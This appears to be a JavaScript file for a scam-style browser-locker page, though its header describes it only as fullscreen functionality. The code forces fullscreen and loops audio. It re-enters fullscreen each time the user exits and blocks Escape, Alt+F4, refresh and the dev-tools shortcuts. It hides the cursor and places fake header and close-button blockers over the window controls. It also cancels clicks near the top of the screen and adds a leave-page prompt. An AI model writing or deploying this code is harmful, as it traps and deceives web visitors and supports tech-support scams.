/**
 * Main JavaScript file for fullscreen functionality
 */

document.addEventListener('DOMContentLoaded', function() {
  // Get audio element
  const audio = document.getElementById('audio');
  
  // Function to toggle fullscreen
  function toggleFullScreen() {
    setTimeout(function() {
      try {
        if (!document.fullscreenElement && 
            !document.mozFullScreenElement && 
            !document.webkitFullscreenElement) {
          const elem = document.documentElement;
          
          if (elem.requestFullscreen) {
            elem.requestFullscreen();
          } else if (elem.mozRequestFullScreen) { /* Firefox */
            elem.mozRequestFullScreen();
          } else if (elem.webkitRequestFullscreen) { /* Chrome, Safari & Opera */
            elem.webkitRequestFullscreen();
          } else if (elem.msRequestFullscreen) { /* IE/Edge */
            elem.msRequestFullscreen();
          }
        }
      } catch(err) {
        console.error("Fullscreen error: ", err);
      }
    }, 100);
  }
  
  // Function to exit fullscreen
  function exitFullscreen() {
    if (document.exitFullscreen) {
      document.exitFullscreen();
    } else if (document.webkitExitFullscreen) {
      document.webkitExitFullscreen();
    } else if (document.mozCancelFullScreen) {
      document.mozCancelFullScreen();
    } else if (document.msExitFullscreen) {
      document.msExitFullscreen();
    }
  }
  
  // Force cursor to be hidden in fullscreen mode
  function forceHideCursor() {
    if (document.fullscreenElement || 
        document.webkitFullscreenElement || 
        document.mozFullScreenElement || 
        document.msFullscreenElement) {
      document.body.classList.add('fullscreen-active');
      document.documentElement.style.cursor = 'none';
      
      // Apply to all elements
      const allElements = document.getElementsByTagName('*');
      for (let i = 0; i < allElements.length; i++) {
        allElements[i].style.cursor = 'none';
      }
    }
  }
  
  // Event handlers for fullscreen changes
  document.addEventListener('fullscreenchange', function() {
    if (document.fullscreenElement) {
      document.body.classList.add('fullscreen-active');
      document.documentElement.style.cursor = 'none';
      
      // Apply cursor none to all elements again
      const allElements = document.getElementsByTagName('*');
      for (let i = 0; i < allElements.length; i++) {
        allElements[i].style.cursor = 'none';
      }
      
      // Force fullscreen again if it attempts to exit
      setTimeout(function() {
        const elem = document.documentElement;
        if (!document.fullscreenElement && elem.requestFullscreen) {
          elem.requestFullscreen({navigationUI: 'hide'});
        }
      }, 100);
    } else {
      // Try to re-enter fullscreen immediately
      const elem = document.documentElement;
      if (elem.requestFullscreen) {
        try {
          elem.requestFullscreen({navigationUI: 'hide'});
        } catch(err) {
          elem.requestFullscreen();
        }
      }
      
      // If we can't re-enter, then restore normal cursor
      setTimeout(function() {
        if (!document.fullscreenElement) {
          // Try again
          if (elem.requestFullscreen) {
            elem.requestFullscreen();
          }
          document.body.classList.add('fullscreen-active');
          document.documentElement.style.cursor = 'none';
        }
      }, 200);
    }
  });
  
  // Add support for other browser prefixes
  document.addEventListener('webkitfullscreenchange', function() {
    if (document.webkitFullscreenElement) {
      document.body.classList.add('fullscreen-active');
      document.documentElement.style.cursor = 'none';
      
      // Apply cursor none to all elements
      const allElements = document.getElementsByTagName('*');
      for (let i = 0; i < allElements.length; i++) {
        allElements[i].style.cursor = 'none';
      }
    } else {
      // Try to re-enter fullscreen immediately
      try {
        document.documentElement.webkitRequestFullscreen({navigationUI: 'hide'});
      } catch(err) {
        document.documentElement.webkitRequestFullscreen();
      }
    }
  });
  
  // Click handlers
  document.addEventListener('click', function() {
    // Play audio on click
    audio.play();
    audio.loop = true;
    
    // Enter fullscreen on click
    toggleFullScreen();
  });
  
  // Prevent right-click and enter fullscreen
  document.addEventListener('contextmenu', function(e) {
    toggleFullScreen();
    e.preventDefault();
  });
  
  // Handle keyboard events
  document.addEventListener('keydown', function(e) {
    // Force fullscreen on any key press
    toggleFullScreen();
    
    // Prevent Escape key from exiting fullscreen
    if (e.key === 'Escape') {
      e.preventDefault();
      e.stopPropagation();
      return false;
    }
    
    // Prevent common keyboard shortcuts
    if (e.key === 'F4' && e.altKey || // alt + f4
        e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C' || e.key === 'U' || e.key === 'S') || // dev tools shortcuts
        e.key === 'F5' || // refresh
        e.key === 'F11') { // browser fullscreen
      e.preventDefault();
    }
  });
  
  // Hide cursor when mouse moves in fullscreen
  document.addEventListener('mousemove', function(e) {
    forceHideCursor();
    
    // Prevent mouse interactions near the top of the screen
    if (e.clientY < 100) {
      try {
        e.preventDefault();
        e.stopPropagation();
      } catch(err) {
        // Some browsers may not allow this, so we catch errors
      }
    }
    
    // When mouse is within 150px of the top, create additional protection
    if (e.clientY < 150) {
      // Make sure the fake header is in the right place
      document.querySelector('.fake-header').style.top = '0px';
      
      // When near the top right (where close button is), add extra protection
      if (e.clientX > window.innerWidth - 200) {
        document.querySelector('.close-button-blocker').style.display = 'block';
        document.querySelector('.window-controls-blocker').style.display = 'block';
        
        // Try to block the event
        e.preventDefault();
        e.stopPropagation();
        
        // Force cursor hiding again
        document.body.style.cursor = 'none';
        document.documentElement.style.cursor = 'none';
      }
      
      // Request fullscreen again if needed
      const elem = document.documentElement;
      if (!document.fullscreenElement && elem.requestFullscreen) {
        try {
          elem.requestFullscreen({navigationUI: 'hide'});
        } catch(err) {
          elem.requestFullscreen();
        }
      }
    }
  });
  
  // Additional protection for mouse clicks near the top
  document.addEventListener('mousedown', function(e) {
    if (e.clientY < 150) {
      e.preventDefault();
      e.stopPropagation();
      
      // Force fullscreen
      const elem = document.documentElement;
      if (elem.requestFullscreen) {
        try {
          elem.requestFullscreen({navigationUI: 'hide'});
        } catch(err) {
          elem.requestFullscreen();
        }
      }
      
      return false;
    }
  }, true);
  
  // Button event listeners
  document.querySelector('.close-btn').addEventListener('click', function() {
    exitFullscreen();
  });

  document.querySelector('.continue-btn').addEventListener('click', function() {
    toggleFullScreen();
  });
  
  // Initial call to hide cursor if already in fullscreen
  forceHideCursor();
  
  // Prevent page from closing with beforeunload
  window.addEventListener('beforeunload', function(e) {
    const message = "You have attempted to leave this page. Are you sure?";
    e.returnValue = message;
    return message;
  });
});
